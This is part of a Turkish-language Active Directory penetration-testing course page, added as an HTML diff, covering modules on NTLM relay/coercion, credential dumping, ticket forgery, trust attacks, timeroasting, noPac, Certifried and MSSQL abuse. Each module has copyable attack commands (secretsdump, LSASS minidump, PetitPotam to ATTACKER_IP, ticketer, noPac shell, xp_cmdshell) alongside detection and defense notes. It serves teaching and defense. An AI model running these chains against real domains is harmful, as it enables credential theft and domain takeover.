+        <div class="body"><p>NTLM'de istemci, sunucuya kimliğini kanıtlar ama bu kanıt <b>belirli bir hedefe
+          bağlı değildir</b> (imzalama/kanal bağlama yoksa). <span class="k">Relay</span>: sen ortada durur,
+          A'nın kimlik doğrulamasını alıp <b>B'ye iletirsin</b>; B, A gibi davrandığını sanır.
+          <span class="k">Coercion</span>: bir makineyi (özellikle DC'yi) <b>sana kimlik doğrulamaya zorlarsın</b>
+          (PetitPotam, PrinterBug) — böylece relay için taze bir kimlik yaratırsın.</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic why">⚙️</div><h3>Neden çalışır</h3></div>
+        <div class="body"><p>SMB imzalaması zorunlu değilse, veya LDAP kanal bağlama kapalıysa, iletilen kimlik
+          hedefte geçerli olur. Bir <b>makine hesabını</b> ADCS web enrollment'a (ESC8) veya LDAP'a
+          relay edip <b>o makine adına sertifika/RBCD</b> alabilirsin. Coercion, kurbanın kendi ayağına
+          gelmesini beklemeden bunu tetiklemeni sağlar.</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic lab">🔬</div><h3>Lab — ESC8 (relay → ADCS)</h3></div>
+        <div class="body">
+          <pre><span class="c"># 1) Relay dinleyici — DC$ kimliğini CA web enrollment'a ilet</span>
+impacket-ntlmrelayx -t http://<span class="p">CA_IP</span>/certsrv/certfnsh.asp -smb2support --adcs --template <span class="s">DomainController</span>
+<span class="c"># 2) Ayrı terminalde — DC'yi bize kimlik doğrulamaya zorla (coercion)</span>
+python3 PetitPotam.py -u <span class="s">user</span> -p <span class="s">'Parola!'</span> <span class="p">ATTACKER_IP</span> <span class="p">DC_IP</span>
+<span class="c"># (alternatif) Coercer ile birden çok yöntem dene</span>
+coercer coerce -u <span class="s">user</span> -p <span class="s">'Parola!'</span> -t <span class="p">DC_IP</span> -l <span class="p">ATTACKER_IP</span>
+<span class="c"># 3) ntlmrelayx çıktısındaki DC sertifikası (base64) ile TGT/hash al</span>
+certipy auth -pfx dc.pfx -dc-ip <span class="p">DC_IP</span><button class="copy">kopyala</button></pre>
+          <div class="callout tip"><span class="ct">Diğer hedefler</span> LDAP(S)'e relay →
+          <code>--delegate-access</code> ile RBCD kur (M07) veya Shadow Credentials ekle (M08). Relay hedefini
+          "ne kazanacağıma göre" seç.</div>
+        </div></div>
+
+      <div class="step"><div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body"><p>DC makine hesabının (<code>DC$</code>) sertifikası → oradan NT hash → DCSync
+          mümkün. ESC8 zinciri bankada yüksek etkilidir ama gürültülüdür.</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic det">🛡️</div><h3>Tespit &amp; savunma</h3></div>
+        <div class="body"><div class="callout det"><span class="ct">İz</span> Coercion, DC'de beklenmedik
+          giden SMB/RPC (MS-EFSR, MS-RPRN) bağlantıları bırakır; relay hedefinde anormal kimlik. Savunma:
+          <b>SMB imzalamayı zorunlu kılmak</b>, LDAP kanal bağlama + imzalama, ADCS'de HTTP enrollment'ı
+          kapatmak/EPA açmak, PetitPotam yamaları. Bu yüzden coercion scope'ta değilse <b>dokunma</b>.</div></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body"><ul>
+          <li>Lab'da SMB imzalamayı kapat, relay ile bir hostta kod çalıştır; sonra imzalamayı aç ve bozulmasını gör.</li>
+          <li>ESC8 zincirini uçtan uca kur → DC sertifikası al.</li>
+          <li>"Coercion neden relay'i güçlendirir?" — açıkla.</li>
+        </ul>
+        <div class="done-row"><label><input type="checkbox" data-done="m10">Bu modülü tamamladım</label><span class="st">10 / 20</span></div></div></div>
+    </section>
+
+    <!-- M11 CREDS -->
+    <section class="mod" id="m11" data-mod>
+      <div class="mod-badge">MODÜL 11 <span class="lv">ele geçirme · EDR dikkat</span></div>
+      <h2>Credential Toplama</h2>
+      <p class="sub">LSASS, SAM, DPAPI, DCSync — ve EDR'ı tetiklemeden yapmanın yolları.</p>
+
+      <div class="step"><div class="step-h"><div class="ic concept">🧠</div><h3>Kavram</h3></div>
+        <div class="body"><p>Bir makinede yerel admin/SYSTEM olduğunda, oradaki kimlik sırlarını hasat edersin:</p>
+          <ul>
+            <li><span class="k">SAM/LSA</span> — yerel hesap hash'leri ve LSA secrets.</li>
+            <li><span class="k">LSASS belleği</span> — oturum açmış kullanıcıların NTLM hash'i, Kerberos bileti, bazen plaintext.</li>
+            <li><span class="k">DPAPI</span> — kayıtlı tarayıcı/RDP/kimlik bilgileri.</li>
+            <li><span class="k">NTDS.dit (DCSync)</span> — DC'de veya replikasyon yetkisiyle <b>tüm domain hash'leri</b>.</li>
+          </ul></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic why">⚙️</div><h3>Neden çalışır & EDR gerçeği</h3></div>
+        <div class="body"><p>Bu sırlar makinede kullanılabilir halde durur (SSO için). Ama <b>LSASS'a erişim
+          modern EDR'ın #1 izlediği davranıştır</b>. Bankada doğrudan Mimikatz çoğu zaman anında yakalanır.
+          O yüzden "toplama" kadar "nasıl toplarım" önemlidir: LOLBin ile dump alıp <b>offline parse</b>,
+          veya hiç LSASS'a dokunmadan DCSync/sertifika yolu.</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic lab">🔬</div><h3>Lab</h3></div>
+        <div class="body">
+          <pre><span class="c"># Uzaktan SAM + LSA (local admin gerekli)</span>
+impacket-secretsdump <span class="p">bank.local</span>/<span class="s">admin</span>:<span class="s">'Parola!'</span>@<span class="p">HOST_IP</span>
+<span class="c"># DCSync — tek hedef kullanıcı (tüm domain'i dump'lama!)</span>
+impacket-secretsdump <span class="p">bank.local</span>/<span class="s">da</span>:<span class="s">'Parola!'</span>@<span class="p">DC_IP</span> -just-dc-user <span class="s">krbtgt</span>
+<span class="c"># LSASS'ı LOLBin ile dump'la (Mimikatz'tan sessiz), offline parse et</span>
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump <span class="p">&lt;lsass_pid&gt;</span> C:\temp\l.dmp full
+pypykatz lsa minidump l.dmp
+<span class="c"># DPAPI — kayıtlı sırlar</span>
+impacket-dpapi ...  <span class="c"># masterkey + credential blob çözümü</span><button class="copy">kopyala</button></pre>
+        </div></div>
+
+      <div class="step"><div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body"><p>NTLM hash'ler (<code>user:rid:lm:nt:::</code>), Kerberos anahtarları. Parola
+          <b>tekrar kullanımı (reuse)</b> ara — aynı local admin hash'i birçok makinede geçerliyse yatay
+          hareket açılır. krbtgt hash'i aldıysan Modül 12'ye geç.</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic det">🛡️</div><h3>Tespit &amp; savunma</h3></div>
+        <div class="body"><div class="callout det"><span class="ct">İz</span> <b>DCSync = 4662</b> (DRSUAPI
+          replikasyon; beklenmedik host'tan gelirse #1 alarm), LSASS handle açma (4656 / EDR API kancası),
+          servis oluşturma (7045) uzaktan dump araçlarında. Savunma: LAPS (local hash reuse'u kırar),
+          Credential Guard (LSASS'ı korur), Tier-0 izolasyonu, Protected Users, DCSync yetkisi denetimi.</div>
+          <p>Bankada: doğrudan Mimikatz çalıştırma; mümkünse hiç LSASS'a dokunma, sertifika/DCSync gibi
+          sessiz yolları tercih et ve <b>tüm domain'i değil sadece PoC hedefini</b> dump'la.</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body"><ul>
+          <li>Bir üye sunucuda SAM dump al, hash reuse'u başka makinede test et (M12 PtH).</li>
+          <li>krbtgt hash'ini DCSync ile (tek kullanıcı) çek.</li>
+          <li>DC'de kendi DCSync'inin 4662 olayını bul — mavi takım bunu neden kolay yakalar?</li>
+        </ul>
+        <div class="done-row"><label><input type="checkbox" data-done="m11">Bu modülü tamamladım</label><span class="st">11 / 20</span></div></div></div>
+    </section>
+
+    <!-- M12 DOMINANCE -->
+    <section class="mod" id="m12" data-mod>
+      <div class="mod-badge">MODÜL 12 <span class="lv">ele geçirme · zirve</span></div>
+      <h2>Domain Dominance &amp; Ticket Forgery</h2>
+      <p class="sub">Golden / Silver / Diamond ticket, Pass-the-Hash/Ticket, kalıcılık ve temizlik.</p>
+
+      <div class="step"><div class="step-h"><div class="ic concept">🧠</div><h3>Kavram</h3></div>
+        <div class="body"><p>Modül 02'yi hatırla: TGT, <b>krbtgt</b> hash'iyle şifrelenir; TGS ise <b>servis
+          hesabının</b> hash'iyle. Bu anahtarlar sende ise <b>sahte bilet</b> üretebilirsin:</p>
+          <ul>
+            <li><span class="k">Golden Ticket</span> — krbtgt hash'iyle istediğin kimlikte sahte <b>TGT</b>. Tüm domain'e sınırsız erişim.</li>
+            <li><span class="k">Silver Ticket</span> — bir servis hesabının hash'iyle, yalnızca <b>o servise</b> sahte TGS. Daha dar ama KDC'ye hiç uğramaz → daha sessiz.</li>
+            <li><span class="k">Diamond Ticket</span> — gerçek bir TGT'yi alıp <b>değiştirir</b>; Golden'a göre çok daha az tespit edilir.</li>
+          </ul>
+          <p>Ayrıca elde ettiğin hash/bilet ile <span class="k">Pass-the-Hash</span> ve <span class="k">Pass-the-Ticket</span> yaparak makineler arası dolaşırsın.</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic why">⚙️</div><h3>Neden çalışır</h3></div>
+        <div class="body"><p>Kerberos, biletin içeriğine <b>güvenir</b> — biletin anahtarını bilen onu üretebilir.
+          krbtgt parolası neredeyse hiç değişmediği için Golden Ticket uzun ömürlüdür. Bu, "domain hâkimiyeti"nin
+          teknik karşılığıdır. Pentestte amaç <b>etkiyi kanıtlamak</b>, kalıcı arka kapı bırakmak değil.</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic lab">🔬</div><h3>Lab</h3></div>
+        <div class="body">
+          <pre><span class="c"># Golden ticket (krbtgt NT hash + domain SID gerekir)</span>
+impacket-ticketer -nthash <span class="s">&lt;krbtgt_hash&gt;</span> -domain-sid <span class="s">S-1-5-21-...</span> -domain <span class="p">bank.local</span> <span class="s">Administrator</span>
+export KRB5CCNAME=Administrator.ccache
+impacket-wmiexec -k -no-pass <span class="p">bank.local</span>/<span class="s">Administrator</span>@<span class="s">dc.bank.local</span>
+<span class="c"># Silver ticket (servis hash'iyle, tek servise) — KDC'ye uğramaz</span>
+impacket-ticketer -nthash <span class="s">&lt;svc_hash&gt;</span> -domain-sid <span class="s">S-1-5-21-...</span> -domain <span class="p">bank.local</span> -spn <span class="s">cifs/host</span> <span class="s">Administrator</span>
+<span class="c"># Diamond (gerçek TGT'yi baz alır → daha sessiz)</span>
+Rubeus.exe diamond /krbkey:<span class="s">&lt;krbtgt_aes&gt;</span> /user:<span class="s">user</span> /password:<span class="s">'Parola!'</span> /ticketuser:<span class="s">Administrator</span>
+<span class="c"># Pass-the-Hash ile yatay hareket</span>
+nxc smb <span class="p">10.0.0.0/24</span> -u <span class="s">admin</span> -H <span class="s">&lt;NTLM&gt;</span> --local-auth<button class="copy">kopyala</button></pre>
+        </div></div>
+
+      <div class="step"><div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body"><p>DC üzerinde <b>Administrator</b> olarak kod çalıştırma — domain hâkimiyeti PoC'si.
+          Rapor için ekran görüntüsü + zaman damgası yeterli. <b>Kalıcı golden bırakma.</b></p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic det">🛡️</div><h3>Tespit, temizlik &amp; etik</h3></div>
+        <div class="body"><div class="callout det"><span class="ct">İz</span> Golden ticket anormal bilet süresi
+          (varsayılan 10 yıl!), RC4 downgrade, PAC tutarsızlığı ile yakalanır. Silver, KDC log'unu atlar ama
+          hedef servis loglarında görünebilir. Savunma: <b>krbtgt parolasını 2× reset</b> (bilet iptali),
+          AES kullanımı, PAC doğrulama.</div>
+          <div class="callout warn"><span class="ct">Etik / temizlik</span> Gerçekçi bilet süresi ver (10 yıl
+          değil). Engagement sonunda krbtgt'nin 2 kez sıfırlanmasını <b>öner</b> ve bıraktığın hiçbir bilet/
+          hesabın kalmadığını doğrula. Her artefaktı "temizlik listesi"nde tut.</div></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body"><ul>
+          <li>krbtgt hash'iyle golden ticket üret, DC'de shell al (gerçekçi süreyle).</li>
+          <li>Aynı hedefe silver ticket üret, log farkını (KDC'ye uğramama) gözlemle.</li>
+          <li>krbtgt'yi 2× resetleyip golden ticket'ının geçersiz kaldığını doğrula.</li>
+        </ul>
+        <div class="done-row"><label><input type="checkbox" data-done="m12">Bu modülü tamamladım</label><span class="st">12 / 20</span></div></div></div>
+    </section>
+
+    <!-- M13 TRUST -->
+    <section class="mod" id="m13" data-mod>
+      <div class="mod-badge">MODÜL 13 <span class="lv">ileri · geniş kapsam</span></div>
+      <h2>Trust &amp; Forest Saldırıları</h2>
+      <p class="sub">Bir domain'i aldın — peki diğer domain/forest'a nasıl geçilir?</p>
+
+      <div class="step"><div class="step-h"><div class="ic concept">🧠</div><h3>Kavram</h3></div>
+        <div class="body"><p>Organizasyonlar birden çok domain/forest içerir ve aralarında <span class="k">trust</span>
+          (güven ilişkisi) kurar. Trust'lar tek/çift yönlü, transitif olabilir. Anahtar fikirler:</p>
+          <ul>
+            <li><span class="k">Domain trust (aynı forest)</span> — güvenlik sınırı forest olduğu için, child domain'den
+            forest root'a yükseltme genelde <b>mümkündür</b> (SID history / krbtgt).</li>
+            <li><span class="k">Forest trust</span> — daha güçlü bir sınır; <b>SID filtering</b> devrede olabilir. Yine de
+            trust anahtarı (inter-realm key) ile trust'ı geçen biletler üretilebilir.</li>
+            <li><span class="k">SID History</span> — bir bilete başka domain'in yüksek yetkili SID'ini eklemek → o domain'de yetki.</li>
+          </ul></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic why">⚙️</div><h3>Neden çalışır</h3></div>
+        <div class="body"><p>Child domain'in krbtgt'sini aldıysan, PAC'e forest root'un Enterprise Admins
+          SID'ini (<code>-519</code>) ekleyerek forest genelinde yetki alan bir bilet üretebilirsin — SID
+          filtering aynı forest içinde varsayılan olarak uygulanmaz. Forest trust'ta ise inter-realm trust
+          anahtarıyla "trust ticket" üretip karşı forest'ın kaynaklarına geçebilirsin (SID filtering izin verdiği ölçüde).</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic lab">🔬</div><h3>Lab</h3></div>
+        <div class="body">
+          <pre><span class="c"># Trust ilişkilerini haritala</span>
+nxc ldap <span class="p">DC_IP</span> -u <span class="s">user</span> -p <span class="s">'Parola!'</span> -M enum_trusts
+<span class="c"># (PowerView) tüm domain trust'ları</span>
+Get-DomainTrust -API
+<span class="c"># Child -> forest root: SID history'li golden ticket (Enterprise Admins -519)</span>
+impacket-ticketer -nthash <span class="s">&lt;child_krbtgt&gt;</span> -domain-sid <span class="s">&lt;child_SID&gt;</span> -domain <span class="p">child.bank.local</span> \
+  -extra-sid <span class="s">&lt;root_SID&gt;-519</span> <span class="s">Administrator</span>
+<span class="c"># Forest trust ticket (inter-realm key ile)</span>
+Rubeus.exe silver /service:krbtgt/<span class="s">root.local</span> /rc4:<span class="s">&lt;trust_key&gt;</span> /sids:<span class="s">...</span> /user:<span class="s">Administrator</span><button class="copy">kopyala</button></pre>
+        </div></div>
+
+      <div class="step"><div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body"><p>Hedef domain/forest'ta yüksek yetkili erişim. Bankada tipik olarak üretim +
+          yönetim + eski satın alınan şirket domain'leri arasında trust bulunur — tam etkiyi göstermek için
+          bu geçişleri haritalamak değerlidir. <b>Kapsam dışına çıkmadığından emin ol</b> (başka forest scope'ta mı?).</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic det">🛡️</div><h3>Tespit &amp; savunma</h3></div>
+        <div class="body"><div class="callout det"><span class="ct">İz</span> Cross-domain anormal biletler,
+          extra-SID içeren PAC'ler, trust anahtarı kullanımı. Savunma: forest'lar arası <b>SID filtering</b>'i
+          zorunlu kılmak, selective authentication, child domain'i Tier-0 olarak görmemek (child = forest ele
+          geçirme riski), krbtgt hijyeni.</div></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body"><ul>
+          <li>Lab'ında bir child domain kur, krbtgt'siyle SID history'li bilet üretip root'a geç.</li>
+          <li>"Neden child domain ele geçirmek forest ele geçirmek demektir?" — açıkla.</li>
+          <li>SID filtering'i aç, forest trust geçişinin nasıl kısıtlandığını gözlemle.</li>
+        </ul>
+        <div class="done-row"><label><input type="checkbox" data-done="m13">Bu modülü tamamladım</label><span class="st">13 / 20</span></div></div></div>
+    </section>
+
+    <!-- FINAL -->
+    <!-- M14 TIMEROASTING -->
+    <section class="mod" id="m14" data-mod>
+      <div class="mod-badge">MODÜL 14 <span class="lv">saldırı · sessiz</span></div>
+      <h2>Timeroasting</h2>
+      <p class="sub">Kimlik doğrulamasız — DC'nin saat servisinden makine hesabı hash'i topla.</p>
+
+      <div class="step">
+        <div class="step-h"><div class="ic concept">🧠</div><h3>Kavram</h3></div>
+        <div class="body">
+          <p>DC'nin NTP servisi (MS-SNTP), gelen zaman isteğine bir <b>bilgisayar hesabının RC4-HMAC anahtarıyla</b>
+          imzalanmış yanıt döner. İmza için sadece hesabın RID'sini göndermen yeter — <b>hiçbir credential
+          gerekmez</b>. Bu imza, makine hesabının parola hash'iyle üretildiği için çevrimdışı kırılabilir.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic why">⚙️</div><h3>Neden çalışır</h3></div>
+        <div class="body">
+          <p>Makine hesabı parolaları normalde 120 karakter rastgeledir (kırılamaz). Ama <b>elle oluşturulmuş</b>,
+          parolası sabitlenmiş ya da eski/uyumsuz cihaz hesaplarında zayıf parola olabilir. Timeroasting bu
+          hesapları credential'sız, gürültüsüz elemenin en temiz yoludur.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic lab">🔬</div><h3>Lab</h3></div>
+        <div class="body">
+          <pre><span class="c"># Auth gerektirmeden tüm RID aralığı için imza topla</span>
+python3 timeroast.py <span class="p">DC_IP</span> -o timeroast.txt
+<span class="c"># Hashcat modu 31300 (MS-SNTP)</span>
+hashcat -m <span class="p">31300</span> timeroast.txt rockyou.txt
+<span class="c"># Alternatif: NetExec modülü</span>
+nxc smb <span class="p">DC_IP</span> -u <span class="s">''</span> -p <span class="s">''</span> -M timeroast<button class="copy">kopyala</button></pre>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body">
+          <p>Her makine hesabı için <code>&lt;RID&gt;:$sntp-ms$&lt;hash&gt;$&lt;salt&gt;</code> biçiminde satırlar. hashcat
+          bunlardan zayıf olanı kırarsa geçerli bir makine hesabı parolası düşer — bunu Modül 07 (delegasyon/RBCD)
+          veya Modül 08 (Shadow Credentials) zincirine besleyebilirsin.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic det">🛡️</div><h3>Tespit &amp; savunma</h3></div>
+        <div class="body">
+          <div class="callout det"><span class="ct">İz</span> Neredeyse görünmez — Kerberos olayı (4768/4769)
+          <b>üretmez</b>, yalnızca UDP/123 trafiği. Savunma: makine hesabı parolalarının otomatik döndürülmesini
+          sağla, elle oluşturulmuş/eski hesapları denetle, gereksiz NTP erişimini sınırla.</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body">
+          <ul>
+            <li>Lab'da bir makine hesabına zayıf parola ver, timeroast ile bul ve kır.</li>
+            <li>Aynı anda DC loglarına bak — Kerberos olayı oluşmadığını doğrula.</li>
+          </ul>
+          <div class="done-row"><label><input type="checkbox" data-done="m14">Bu modülü tamamladım</label>
+            <span class="st">14 / 20</span></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- M15 NOPAC -->
+    <section class="mod" id="m15" data-mod>
+      <div class="mod-badge">MODÜL 15 <span class="lv">saldırı · CVE</span></div>
+      <h2>noPac — sAMAccountName Spoofing</h2>
+      <p class="sub">CVE-2021-42278 + 42287: standart kullanıcıdan tek adımda Domain Admin (yamasızsa).</p>
+
+      <div class="step">
+        <div class="step-h"><div class="ic concept">🧠</div><h3>Kavram</h3></div>
+        <div class="body">
+          <p>Makine hesapları normalde <code>$</code> ile biter (ör. <code>PC01$</code>). Bu zincirde kontrolündeki bir
+          makine hesabının <code>sAMAccountName</code>'ini bir DC'nin adıyla (<code>DC01</code>, <b>$ olmadan</b>) değiştirirsin.
+          TGT aldıktan sonra hesabı eski adına döndürürsün; S4U2self ile bilet istediğinde KDC kurbanı bulamayıp
+          <b>en yakın eşleşme olan gerçek DC hesabını</b> çözer → DC adına servis bileti alırsın.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic why">⚙️</div><h3>Neden çalışır</h3></div>
+        <div class="body">
+          <p>İki zafiyet birleşir: 42278 sAMAccountName doğrulamasının eksikliği, 42287 ise KDC'nin bilet
+          çözümlemesindeki isim eşleştirme hatası. Koşul: bir domain user + <b>MachineAccountQuota&gt;0</b>
+          (veya mevcut kontrollü makine hesabı).</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic lab">🔬</div><h3>Lab</h3></div>
+        <div class="body">
+          <pre><span class="c"># Önce sadece tara (yama durumunu gör, istismar etme)</span>
+python3 noPac.py <span class="p">bank.local</span>/<span class="s">user</span>:<span class="s">'Parola!'</span> -dc-ip <span class="p">DC_IP</span> -dc-host <span class="s">DC01</span> --impersonate <span class="s">administrator</span> -dump -use-ldap
+<span class="c"># Bilet al + shell</span>
+python3 noPac.py <span class="p">bank.local</span>/<span class="s">user</span>:<span class="s">'Parola!'</span> -dc-ip <span class="p">DC_IP</span> -dc-host <span class="s">DC01</span> --impersonate <span class="s">administrator</span> -shell -use-ldap<button class="copy">kopyala</button></pre>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body">
+          <p>Administrator olarak DC üzerinde bir <code>cifs/</code> servis bileti ve shell. Yamasız bir DC'de bu
+          doğrudan domain ele geçirmedir; yamalı DC'de KDC hata döner (istismar başarısız).</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic det">🛡️</div><h3>Tespit &amp; savunma</h3></div>
+        <div class="body">
+          <div class="callout det"><span class="ct">İz</span> <b>Event 4741</b> (makine hesabı oluşturma) + kısa sürede
+          <b>4781</b> (sAMAccountName değişikliği) + anormal TGT/TGS akışı. Savunma: <b>KB5008380/KB5008602 yamalarını
+          uygula</b>, MachineAccountQuota=0 yap, hesap oluşturmayı kısıtla.</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body">
+          <ul>
+            <li>Yamasız bir lab DC'sinde zinciri çalıştır, ardından yamayı uygulayıp tekrar dene — farkı gör.</li>
+            <li>Oluşturduğun makine hesabını sil ve 4741/4781 olaylarını DC'de bul.</li>
+          </ul>
+          <div class="done-row"><label><input type="checkbox" data-done="m15">Bu modülü tamamladım</label>
+            <span class="st">15 / 20</span></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- M16 CERTIFRIED -->
+    <section class="mod" id="m16" data-mod>
+      <div class="mod-badge">MODÜL 16 <span class="lv">saldırı · ADCS · CVE</span></div>
+      <h2>Certifried — CVE-2022-26923</h2>
+      <p class="sub">Özel ESC gerektirmeden, varsayılan template ile makine hesabından DC kimliği.</p>
+
+      <div class="step">
+        <div class="step-h"><div class="ic concept">🧠</div><h3>Kavram</h3></div>
+        <div class="body">
+          <p>ADCS, makine sertifikası isteğinde kimliği <code>dNSHostName</code> özniteliğine göre eşler. Kontrolündeki
+          bir makine hesabının <code>dNSHostName</code>'ini bir DC'ninkiyle çakıştırırsan, varsayılan
+          <code>Machine</code> template'inden aldığın sertifika <b>DC kimliğine</b> eşlenir → PKINIT ile DC hesabının
+          TGT ve NT hash'ini alırsın. Modül 09'daki ESC yollarının aksine özel bir yanlış yapılandırma gerekmez.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic why">⚙️</div><h3>Neden çalışır</h3></div>
+        <div class="body">
+          <p>Yama öncesi ADCS, sertifikadaki kimliği güçlü bir bağla (SID) değil, değiştirilebilir <code>dNSHostName</code>
+          ile eşliyordu. Koşul: domain user + <b>MachineAccountQuota&gt;0</b> ve ADCS mevcut.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic lab">🔬</div><h3>Lab</h3></div>
+        <div class="body">
+          <pre><span class="c"># 1) Makine hesabı oluştur</span>
+certipy account create -u <span class="s">user</span>@<span class="p">bank.local</span> -p <span class="s">'Parola!'</span> -user <span class="s">EVIL</span> -pass <span class="s">'Evil123!'</span> -dns <span class="s">dc01.bank.local</span> -dc-ip <span class="p">DC_IP</span>
+<span class="c"># 2) dNSHostName çakışmasıyla sertifika iste</span>
+certipy req -u <span class="s">'EVIL$'</span>@<span class="p">bank.local</span> -p <span class="s">'Evil123!'</span> -ca <span class="s">BANK-CA</span> -template <span class="s">Machine</span> -dc-ip <span class="p">DC_IP</span>
+<span class="c"># 3) Sertifikayla DC hesabının TGT + hash'i → DCSync</span>
+certipy auth -pfx dc01.pfx -dc-ip <span class="p">DC_IP</span><button class="copy">kopyala</button></pre>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body">
+          <p>DC makine hesabının (<code>DC01$</code>) NT hash'i ve TGT'si. Bu hash ile DCSync yaparak (Modül 11/12)
+          domain'i ele geçirirsin. Yamalı ortamda sertifika eşlemesi reddedilir.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic det">🛡️</div><h3>Tespit &amp; savunma</h3></div>
+        <div class="body">
+          <div class="callout det"><span class="ct">İz</span> Makine hesabı oluşturma (4741) + <code>dNSHostName</code>
+          değişikliği (5136) + CA'da sertifika issuance. Savunma: <b>KB5014754 yamasını uygula</b> (güçlü sertifika
+          eşlemesi / SID uzantısı), MachineAccountQuota=0, CA issuance denetimi.</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body">
+          <ul>
+            <li>Yol boyunca alınan sertifikayı <code>certipy</code> ile incele; kimliğin nasıl DC'ye eşlendiğini gör.</li>
+            <li>KB5014754 sonrası "strong mapping" modunda aynı denemenin neden başarısız olduğunu açıkla.</li>
+          </ul>
+          <div class="done-row"><label><input type="checkbox" data-done="m16">Bu modülü tamamladım</label>
+            <span class="st">16 / 20</span></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- M17 MSSQL -->
+    <section class="mod" id="m17" data-mod>
+      <div class="mod-badge">MODÜL 17 <span class="lv">saldırı · yaygın</span></div>
+      <h2>MSSQL İstismarı</h2>
+      <p class="sub">Impersonation, linked server zincirleri ve xp_cmdshell ile SQL'den domain'e.</p>
+
+      <div class="step">
+        <div class="step-h"><div class="ic concept">🧠</div><h3>Kavram</h3></div>
+        <div class="body">
+          <p>MSSQL sunucuları AD ile derinden entegredir ve genelde yüksek yetkili servis hesaplarıyla çalışır.
+          Üç ana yol: <b>EXECUTE AS / IMPERSONATE</b> ile veritabanı içinde yetki tırmanışı, <b>linked server</b>
+          zincirleriyle sunucular arası kod çalıştırma ve <b>xp_cmdshell</b> ile OS komutu.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic why">⚙️</div><h3>Neden çalışır</h3></div>
+        <div class="body">
+          <p>Linked server'lar çoğu zaman yüksek yetkiyle ve karşılıklı güvenle kurulur; <code>IMPERSONATE</code> hakları
+          fazla dağıtılır; servis hesabı SYSTEM/yüksek yetkilidir. Zayıf konfigürasyon = SQL'den domain'e köprü.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic lab">🔬</div><h3>Lab</h3></div>
+        <div class="body">
+          <pre><span class="c"># SPN'lerden MSSQL örneklerini bul</span>
+impacket-GetUserSPNs <span class="p">bank.local</span>/<span class="s">user</span>:<span class="s">'Parola!'</span> -dc-ip <span class="p">DC_IP</span> | grep -i MSSQL
+<span class="c"># Windows: örnek + linked server zincirini keşfet (PowerUpSQL)</span>
+Get-SQLInstanceDomain | Get-SQLServerLinkCrawl -Verbose
+<span class="c"># Kerberos ile bağlan ve komut çalıştır</span>
+impacket-mssqlclient <span class="p">bank.local</span>/<span class="s">user</span>:<span class="s">'Parola!'</span>@<span class="p">sql01.bank.local</span> -k<button class="copy">kopyala</button></pre>
+          <pre><span class="c"># mssqlclient içinde:</span>
+EXECUTE AS LOGIN = <span class="s">'sa'</span>; SELECT SYSTEM_USER;
+enable_xp_cmdshell
+xp_cmdshell whoami
+<span class="c"># Linked server üzerinden uzak SQL'de komut</span>
+EXEC (<span class="s">'xp_cmdshell ''whoami'''</span>) AT <span class="s">[SQL02]</span><button class="copy">kopyala</button></pre>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body">
+          <p><code>nt service\mssqlserver</code> veya <code>nt authority\system</code> gibi bir bağlam. Buradan
+          Modül 11 (credential toplama) ve Modül 07 (RBCD/delegasyon) ile domain'e sıçrarsın.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic det">🛡️</div><h3>Tespit &amp; savunma</h3></div>
